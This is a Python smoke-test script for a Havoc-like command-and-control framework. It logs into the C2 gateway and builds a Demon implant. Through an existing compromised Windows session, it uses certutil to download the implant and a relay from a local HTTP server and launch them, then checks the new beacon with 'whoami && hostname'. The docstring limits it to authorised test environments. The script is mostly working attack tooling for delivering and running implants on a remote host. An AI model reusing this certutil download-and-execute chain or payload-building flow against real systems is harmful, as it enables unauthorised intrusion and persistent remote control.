#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TCP / KCP / UDP / WebSocket 传输监听器的 Windows 真机冒烟测试。

前提：
- Web 网关运行（默认 http://127.0.0.1:8081，admin/havoc1234）；
- 至少一个健康 Demon 会话作为投递通道；
- 目标 Windows 可访问本机 9921 文件服务与传输监听端口。

流程（每个模式）：
1. 创建传输监听器（上游 = 伴生 HTTP 监听器）；
2. 下载该监听器对应的 Windows 中继器 → 通过已有会话 certutil 投递 → 启动；
3. 通过已有会话 certutil 投递 Demon 载荷 → 启动；
4. 等待新会话（外部地址 127.0.0.1），执行 `shell whoami && hostname` 验证；
5. 清理进程/文件/监听器。

实测 2026-11-09：tcp/kcp/udp/ws 全部 PASS。
仅用于已获得明确书面授权的测试环境。
"""
from __future__ import annotations

import argparse
import asyncio
import json
import secrets
import subprocess
import sys
import time
from pathlib import Path

import aiohttp

BASE = "http://127.0.0.1:8081"
USER, PASSWORD = "admin", "havoc1234"
CLIENT_IP = "192.168.121.132"
COMPANION = "HTP-Smoke-HTTP"
COMPANION_PORT = 18100
FILE_PORT = 9921
MODE_PORTS = {"tcp": 19401, "kcp": 19402, "udp": 19403, "ws": 19404}
OUT = Path("/tmp/htp-smoke")


class Api:
    def __init__(self, base: str):
        self.base = base
        self.s: aiohttp.ClientSession | None = None

    async def __aenter__(self):
        # 127.0.0.1 的 cookie 在 aiohttp 默认 jar 中会被当作 unsafe 丢弃
        self.s = aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True))
        r = await self.s.post(self.base + "/api/login", json={"username": USER, "password": PASSWORD})
        r.raise_for_status()
        return self

    async def __aexit__(self, *exc):
        if self.s:
            await self.s.close()

    async def req(self, method, path, **kw):
        async with self.s.request(method, self.base + path, **kw) as r:
            text = await r.text()
            try:
                data = json.loads(text)
            except Exception:
                data = {"raw": text}
            if r.status >= 400:
                raise RuntimeError(f"{method} {path} -> {r.status}: {data}")
            return data


async def wait_task(api: Api, sid: str, task_id: str, timeout: float = 30) -> str:
    end = time.time() + timeout
    while time.time() < end:
        data = await api.req("GET", f"/api/sessions/{sid}/tasks")
        for task in data.get("tasks", []):
            if task.get("task_id") == task_id and (task.get("output") or task.get("status") == "done"):
                return task.get("output", "")
        await asyncio.sleep(1)
    return ""


async def command(api: Api, sid: str, text: str, timeout: float = 30) -> str:
    data = await api.req("POST", f"/api/sessions/{sid}/command", json={"command": text})
    return await wait_task(api, sid, data["task"]["task_id"], timeout)


async def shell(api: Api, sid: str, text: str, timeout: float = 30) -> str:
    return await command(api, sid, "shell " + text, timeout)


async def proc_create(api: Api, sid: str, path: str, args: str = "") -> str:
    return await command(api, sid, "proc create normal --silent --no-pipe " + path +
                         ((" " + args) if args else ""), 20)


async def sessions(api: Api) -> list[dict]:
    return (await api.req("GET", "/api/sessions"))["sessions"]


async def listeners(api: Api) -> list[dict]:
    return (await api.req("GET", "/api/listeners"))["listeners"]


def pick_base(items: list[dict]) -> str | None:
    for s in items:
        if s.get("health") == "healthy" and s.get("external_ip") != "127.0.0.1":
            return s["id"]
    return None


async def ensure_companion(api: Api) -> None:
    names = {l["name"] for l in await listeners(api)}
    if COMPANION in names:
        return
    await api.req("POST", "/api/listeners", json={
        "name": COMPANION, "protocol": "Http", "host_bind": "0.0.0.0",
        "port_bind": str(COMPANION_PORT), "port_conn": str(COMPANION_PORT),
        "hosts": CLIENT_IP, "host_rotation": "round-robin",
        "headers": "Accept: */*", "uris": "/api/v1/status",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/120.0 Safari/537.36",
        "secure": "false", "proxy_enabled": "true", "proxy_type": "http",
        "proxy_host": "127.0.0.1", "proxy_port": "1080",
    })
    await asyncio.sleep(1)


async def ensure_payload(api: Api) -> tuple[str, bytes]:
    data = await api.req("GET", "/api/payloads")
    for b in reversed(data.get("builds", [])):
        if b.get("listener") == COMPANION and b.get("status") == "done":
            async with api.s.get(f"{api.base}/api/payloads/{b['id']}/download") as r:
                return b["id"], await r.read()
    info = await api.req("POST", "/api/payloads/build", json={
        "listener": COMPANION, "arch": "x64", "format": "Windows Exe",
        "config": {"sleep": 2, "jitter": 15,
                   "spawn64": "C:\\Windows\\System32\\notepad.exe",
                   "spawn32": "C:\\Windows\\SysWOW64\\notepad.exe"},
    })
    bid = info["build"]["id"]
    end = time.time() + 180
    while time.time() < end:
        data = await api.req("GET", "/api/payloads")
        for b in data.get("builds", []):
            if b["id"] == bid and b["status"] == "done":
                async with api.s.get(f"{api.base}/api/payloads/{bid}/download") as r:
                    return bid, await r.read()
            if b["id"] == bid and b["status"] == "failed":
                raise RuntimeError("payload build failed: " + b.get("error", ""))
        await asyncio.sleep(3)
    raise RuntimeError("payload build timeout")


async def wait_new_session(api: Api, baseline: set[str], timeout: float = 100) -> dict | None:
    end = time.time() + timeout
    while time.time() < end:
        for s in await sessions(api):
            if s["id"] not in baseline and "htp-demon" in (s.get("process") or "").lower():
                return s
        await asyncio.sleep(2)
    return None


async def run_mode(api: Api, base: str, mode: str, payload: bytes) -> tuple[bool, str]:
    port = MODE_PORTS[mode]
    name = f"Smoke-{mode.upper()}"
    OUT.mkdir(parents=True, exist_ok=True)
    print(f"\n=== {mode.upper()} :{port} ===")
    await api.req("POST", "/api/listeners", json={
        "name": name, "mode": mode, "listen_host": "0.0.0.0", "listen_port": port,
        "connect_host": CLIENT_IP, "connect_port": port, "ws_path": "/ws",
        "upstream_host": "127.0.0.1", "upstream_port": COMPANION_PORT,
        "vkey": "smoke-" + secrets.token_hex(8), "salt": secrets.token_hex(8),
        "compress": True, "padding": 4, "http_rewrite": True, "autostart": True,
    })
    try:
        async with api.s.get(f"{api.base}/api/listeners/{name}/relay"
                             f"?os=windows&arch=amd64&listen=127.0.0.1:1080") as r:
            relay = await r.read()
            if r.status != 200:
                raise RuntimeError("relay download failed: " + relay[:120].decode("utf-8", "replace"))
        (OUT / f"relay-{mode}.exe").write_bytes(relay)
        await shell(api, base, "taskkill /F /IM htp-relay.exe >nul 2>&1 & "
                               "taskkill /F /IM htp-demon.exe >nul 2>&1", 15)
        await shell(api, base, f"cmd /c del /f C:\\Users\\Public\\htp-relay.exe >nul 2>&1 & "
                               f"certutil.exe -urlcache -split -f http://{CLIENT_IP}:{FILE_PORT}/relay-{mode}.exe "
                               f"C:\\Users\\Public\\htp-relay.exe", 30)
        await proc_create(api, base, "C:\\Users\\Public\\htp-relay.exe", "--listen 127.0.0.1:1080")
        await asyncio.sleep(3)
        baseline = {s["id"] for s in await sessions(api)}
        await proc_create(api, base, "C:\\Users\\Public\\htp-demon.exe")
        new = await wait_new_session(api, baseline, 100)
        if not new:
            return False, "no session within 100s"
        out = await shell(api, new["id"], "whoami && hostname", 30)
        ok = "admin" in out.lower()
        pid = new.get("pid")
        if pid:
            await command(api, base, f"proc kill {pid}", 15)
        await shell(api, base, "taskkill /F /IM htp-relay.exe >nul 2>&1", 15)
        return ok, f"session={new['id']} {out.strip().splitlines()[:1]}"
    finally:
        try:
            await api.req("DELETE", f"/api/listeners/{name}")
        except Exception:
            pass


async def main() -> int:
    global CLIENT_IP, FILE_PORT
    ap = argparse.ArgumentParser(description="Transport listener Windows smoke test")
    ap.add_argument("--base", default=BASE)
    ap.add_argument("--client-ip", default=CLIENT_IP)
    ap.add_argument("--file-port", type=int, default=FILE_PORT)
    ap.add_argument("--base-sid", default="", help="delivery Demon session id (auto: first healthy)")
    ap.add_argument("--modes", default="tcp,kcp,udp,ws")
    args = ap.parse_args()
    CLIENT_IP, FILE_PORT = args.client_ip, args.file_port
    modes = [m.strip().lower() for m in args.modes.split(",") if m.strip()]

    async with Api(args.base) as api:
        base = args.base_sid or pick_base(await sessions(api))
        if not base:
            print("没有可用的健康 Demon 会话", file=sys.stderr)
            return 2
        print("base session", base)
        await ensure_companion(api)
        bid, payload = await ensure_payload(api)
        OUT.mkdir(parents=True, exist_ok=True)
        (OUT / "htp-demon.exe").write_bytes(payload)
        print("payload", bid, len(payload), "bytes")
        server = subprocess.Popen([sys.executable, "-m", "http.server", str(FILE_PORT),
                                   "--bind", "0.0.0.0", "--directory", str(OUT)],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        await asyncio.sleep(1)
        results = []
        try:
            await shell(api, base, f"cmd /c del /f C:\\Users\\Public\\htp-demon.exe >nul 2>&1 & "
                                   f"certutil.exe -urlcache -split -f http://{CLIENT_IP}:{FILE_PORT}/htp-demon.exe "
                                   f"C:\\Users\\Public\\htp-demon.exe", 30)
            for mode in modes:
                try:
                    ok, detail = await run_mode(api, base, mode, payload)
                except Exception as exc:
                    ok, detail = False, str(exc)
                results.append((mode, ok, detail))
                print(("PASS" if ok else "FAIL"), mode, detail)
        finally:
            server.terminate()
            try:
                server.wait(timeout=5)
            except Exception:
                server.kill()
            try:
                await shell(api, base, "taskkill /F /IM htp-relay.exe >nul 2>&1 & "
                                       "taskkill /F /IM htp-demon.exe >nul 2>&1 & "
                                       "del /f C:\\Users\\Public\\htp-relay.exe "
                                       "C:\\Users\\Public\\htp-demon.exe >nul 2>&1", 15)
            except Exception:
                pass
            for l in await listeners(api):
                if l.get("name", "").startswith("Smoke-"):
                    try:
                        await api.req("DELETE", f"/api/listeners/{l['name']}")
                    except Exception:
                        pass
        print("\n=== SUMMARY ===")
        for mode, ok, detail in results:
            print(f"{mode:4s} {'PASS' if ok else 'FAIL'}  {detail}")
        return 0 if all(ok for _, ok, _ in results) else 1


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
